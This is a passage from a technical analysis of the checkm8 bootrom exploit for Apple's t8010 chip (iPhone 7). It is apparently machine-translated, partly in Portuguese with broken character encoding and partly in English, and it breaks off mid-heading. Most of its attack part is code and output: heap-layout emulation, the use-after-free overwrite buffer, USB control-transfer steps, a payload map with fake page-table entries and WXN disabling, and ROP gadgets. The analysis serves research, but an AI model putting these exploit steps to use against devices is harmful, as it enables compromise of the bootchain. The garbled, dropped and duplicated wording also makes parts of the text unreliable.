cria√ß√£o da tarefa do controlador <code>USB</code> <br><ul><li>  2.1  Estrutura da tarefa ( <code>0x3c0</code> ) </li><li>  2.2  Pilha de tarefas ( <code>0x1000</code> ) </li></ul></li></ol><br></li><li><ol><li>  <code>io_buffer</code> ( <code>0x800</code> ) </li></ol><br></li><li><ol><li>  Descritores de configura√ß√£o <br><ul><li>  4.1  <code>High-Speed</code> ( <code>25</code> ) </li><li>  4.2  <code>Full-Speed</code> ( <code>25</code> ) </li></ul></li></ol><br></li></ul><br><p>  Em seguida, as estruturas de solicita√ß√£o s√£o alocadas.  Se houver um pequeno peda√ßo na pilha, algumas aloca√ß√µes da primeira categoria ir√£o para l√° e todas as outras aloca√ß√µes ser√£o movidas.  Assim, poderemos transbordar <code>usb_device_io_request</code> consultando o buffer antigo.  √â assim: </p><br><p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p>  Para calcular o deslocamento necess√°rio, simplesmente emulamos todas as aloca√ß√µes listadas acima e <code>iBoot</code> um pouco o c√≥digo fonte do heap do <code>iBoot</code> . </p><br><div class="spoiler">  <b class="spoiler_title">Emulando solicita√ß√µes para o heap no DFU</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); // alignment of the low order bytes of addresses in SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = %#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p>  A sa√≠da do programa com 8 solicita√ß√µes no est√°gio <code>heap feng-shui</code> : </p><br><pre> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p>  Como voc√™ pode ver, outro <code>usb_device_io_request</code> aparecer√° no deslocamento de <code>0x5c0</code> desde o in√≠cio do buffer anterior, que corresponde ao c√≥digo da explora√ß√£o: </p><br><pre> <code class="python hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * <span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p>  Voc√™ pode verificar a validade dessas conclus√µes analisando o status atual do heap do <code>SecureRAM</code> , obtido com o <code>checkm8</code> .  Para esse fim, escrevemos um script simples que analisa o despejo do heap e enumera os peda√ßos.  Lembre-se de que durante o estouro <code>usb_device_io_request</code> , parte dos metadados foi danificada; portanto, <code>usb_device_io_request</code> durante a an√°lise. </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): # skipping damaged chunks this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p>  A sa√≠da do script com coment√°rios pode ser encontrada no spoiler.  Voc√™ pode ver que os bytes de ordem baixa correspondem aos resultados da emula√ß√£o. </p><br><div class="spoiler">  <b class="spoiler_title">O resultado da an√°lise da pilha no SecureRAM</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p> You can also achieve an interesting effect by overflowing the configuration descriptors <code>High Speed</code> and <code>Full Speed</code> that are located right after the <code>IO</code> buffer. One of the fields of a configuration descriptor is responsible for its overall length. By overflowing this field, we can read beyond the descriptor. You can try and do it yourself by modifying the exploit. </p><br><h2 id="2-allocation-and-freeing-of-the-io-buffer-without-clearing-the-global-state"> 2. Allocation and freeing of the IO buffer without clearing the global state </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p> At this stage, an incomplete <code>OUT</code> request for uploading the image is created. At the same time, a global state is initialized, and the address of the buffer in the heap is written to the <code>io_buffer</code> . Then, <code>DFU</code> is reset with a <code>DFU_CLR_STATUS</code> request, and a new iteration of <code>DFU</code> begins. </p><br><h2 id="3-overwriting-usb_device_io_request-in-the-heap-with-use-after-free"> 3. Overwriting <code>usb_device_io_request</code> in the heap with <code>use-after-free</code> </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, a <code>usb_device_io_request</code> type object is allocated in the heap, and it is overflown with <code>t8010_overwrite</code> , whose content was defined at the first stage. </p><br><p> The values of <code>t8010_nop_gadget</code> and <code>0x1800B0800</code> should overflow the fields <code>callback</code> and <code>next</code> of the <code>usb_device_io_request</code> structure. </p><br><p> <code>t8010_nop_gadget</code> is shown below and conforms to its name, but besides function return, the previous <code>LR</code> register is restored, and because of that the call <code>free</code> is skipped after the <code>callback</code> function in <code>usb_core_complete_endpoint_io</code> . This is important, because we damage the heap's metadata due to overflow, which would affect the exploit in case of a freeing attempt. </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> <code>next</code> points to <code>INSECURE_MEMORY + 0x800</code> . Later, <code>INSECURE_MEMORY</code> will store the exploit's payload, and at the offset of <code>0x800</code> in the payload, there is a <code>callback-chain</code> , which we'll discuss later on. </p><br><h2 id="4-placing-the-payload"> 4. Placing the payload </h2><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, every following packet is put into the memory area allocated for the image. The payload looks like this: </p><br><pre> <code class="plaintext hljs">0x1800B0000: t8010_shellcode # initializing shell-code ... 0x1800B0180: t8010_handler # new usb request handler ... 0x1800B0400: 0x1000006a5 # fake translation table descriptor # corresponds to SecureROM (0x100000000 -&gt; 0x100000000) # matches the value in the original translation table ... 0x1800B0600: 0x60000180000625 # fake translation table descriptor # corresponds to SecureRAM (0x180000000 -&gt; 0x180000000) # matches the value in the original translation table 0x1800B0608: 0x1800006a5 # fake translation table descriptor # new value translates 0x182000000 into 0x180000000 # plus, in this descriptor,there are rights for code execution 0x1800B0610: disabe_wxn_arm64 # code for disabling WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-execution-of-callback-chain"> 5. Execution of <code>callback-chain</code> </h2><br><pre> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p> After <code>USB</code> reset, the loop of canceling incomplete <code>usb_device_io_request</code> in the queue by going through a linked list is started. In the previous stages, we replaced the rest of the queue, which allows us to control the <code>callback</code> chain. To build this chain, we use this gadget: </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18‚Üëj bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48‚Üëj bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> As you can see, at the offset of <code>0x70</code> from the pointer to the structure, the call's address and its first argument are loaded. With this gadget, we can easily make any <code>f(x)</code> type calls for arbitrary <code>f</code> and <code>x</code> . </p><br><p> The entire call chain can be easily emulated with <code>Unicorn Engine</code> . We did it with our modified version of the plugin <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">uEmu</a> . </p><br><p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p> The results of the entire chain for <code>iPhone 7</code> can be found below. </p><br><h4 id="51-dc_civac-0x1800b0600"> 5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p> Clearing and invalidating the processor's cache at a virtual address. This will make the processor address our payload later. </p><br><h4 id="52-dmb"> 5.2. <code>dmb</code> </h4><br><pre> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p> A memory barrier that guarantees the completion of all operations with the memory done before this instruction. Instructions in high-performance processors can be executed in an order different from the programmed one for the purpose of optimization. </p><br><h4 